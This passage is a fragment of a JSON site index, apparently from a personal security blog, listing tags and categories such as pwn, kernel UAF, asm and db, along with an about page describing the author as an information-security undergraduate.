pwn","slug":"kernel-pwn","link":"/tags/kernel-pwn/"},{"name":"db","slug":"db","link":"/tags/db/"},{"name":"asm","slug":"asm","link":"/tags/asm/"},{"name":"CS","slug":"CS","link":"/tags/CS/"},{"name":"blog","slug":"blog","link":"/tags/blog/"}],"categories":[{"name":"pwn","slug":"pwn","link":"/categorievariants/pwn/"},{"name":"kernel uaf","slug":"kernel-uaf","link":"/categorievariants/kernel-uaf/"},{"name":"db","slug":"db","link":"/categorievariants/db/"},{"name":"asm","slug":"asm","link":"/categorievariants/asm/"},{"name":"CS","slug":"CS","link":"/categorievariants/CS/"},{"name":"misc","slug":"misc","link":"/categorievariants/misc/"}],"pages":[{"title":"about","text":"信息安全专业2021级本科生。","link":"/about/index.html"},{"title":"archives","text":"","link":"/archives/index.html"},{"title":"Categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}]}